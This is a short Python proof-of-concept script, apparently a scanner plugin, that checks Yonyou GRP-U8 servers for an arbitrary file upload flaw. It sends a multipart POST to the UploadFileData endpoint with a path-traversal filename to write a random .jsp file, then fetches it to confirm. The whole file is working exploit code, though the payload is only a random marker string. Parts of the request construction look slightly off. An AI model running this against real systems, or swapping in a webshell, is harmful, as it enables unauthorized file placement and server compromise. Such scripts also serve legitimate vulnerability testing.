import requests
import urllib
from inc.generate_random import generate_random_str
def verify(url):
    relsult = {
        'name': '用友GRP-U8-UploadFileData任意文件上传',
        'vulnerable': False,
        'url': url
    }
    headers = {
        'Connection': 'close',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0',
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'zh-CN,zh;q=0.9',
        'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryzassocxz',
        'Cookie': 'JSESSIONID=0333BDE70A73627168772D5C50956A74',
        'Dfpajaxreq': '1.0',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'X-Requested-With': 'XMLHttpRequest',
        'Accept-Encoding': 'gzip'
    }
    char_data = generate_random_str(10)
    char = generate_random_str(6)
    data = f'''------WebKitFormBoundaryzassocxz
    Content-Disposition: form-data; name="upload"; filename="{char}.jsp"
    Content-Type: application/octet-stream

    {char_data}
    ------WebKitFormBoundaryzassocxz
    Content-Disposition: form-data; name="submit"

    submit
    ------WebKitFormBoundaryzassocxz--'''

    vurl = urllib.parse.urljoin(url, f"/UploadFileData?action=upload_file&filename=../.{char}.jsp")
    try:
        response = requests.post(vurl, headers=headers, data=data)
        if response.status_code == 200:
            vurl = url + f"/UploadFileData?action=upload_file&filename=../.{char}.jsp"
            response = requests.get(vurl)
            if response.status_code == 200 and char_data in response.text:
                relsult['vulnerable'] = True
                relsult['verify'] = vurl
        return relsult

    except:
        return relsult